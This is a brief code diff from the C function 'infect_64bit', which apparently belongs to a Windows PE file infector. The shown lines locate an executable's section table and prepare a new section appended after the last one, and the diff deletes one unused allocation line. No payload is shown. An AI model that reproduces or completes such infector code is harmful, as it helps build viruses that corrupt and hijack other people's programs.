@@ -753,7 +753,6 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
    IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
    IMAGE_SECTION_HEADER *new_section = &section_table[nt_headers->FileHeader.NumberOfSections];
-   CVector result = cvector_alloc(iat, sizeof(uint8_t), 0);
    DWORD new_section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;
 
    /* align the new section offset to the file alignment boundary */
